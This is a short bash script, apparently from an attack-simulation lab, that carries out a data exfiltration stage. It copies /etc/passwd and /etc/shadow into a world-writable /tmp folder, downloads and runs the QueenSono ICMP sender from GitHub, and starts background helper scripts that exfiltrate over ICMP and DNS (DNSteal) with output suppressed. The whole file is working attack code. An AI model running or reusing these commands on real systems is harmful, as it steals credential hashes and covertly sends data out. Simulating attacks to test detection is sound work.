#!/bin/bash
# #[EXFILTRATION]
mkdir -m 777 /tmp/exfiltrate
#Simulate collected files
cat /etc/passwd > /tmp/exfiltrate/passwd
cat /etc/shadow > /tmp/exfiltrate/shadow
# Run qssender to exfilrate via ICMP
wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
chmod +x /tmp/qssender
cp /vagrant/attack/5_Exfiltration/Gp08_run_qssender.sh /tmp/Gp08_run_qssender.sh
chmod +x /tmp/Gp08_run_qssender.sh
nohup /tmp/Gp08_run_qssender.sh &>/dev/null &
# Run DNSteal to exfiltrate via DNS
cp /vagrant/attack/5_Exfiltration/Gp08_run_dnsteal.sh /tmp/Gp08_run_dnsteal.sh
chmod +x /tmp/Gp08_run_dnsteal.sh
nohup /tmp/Gp08_run_dnsteal.sh &>/dev/null &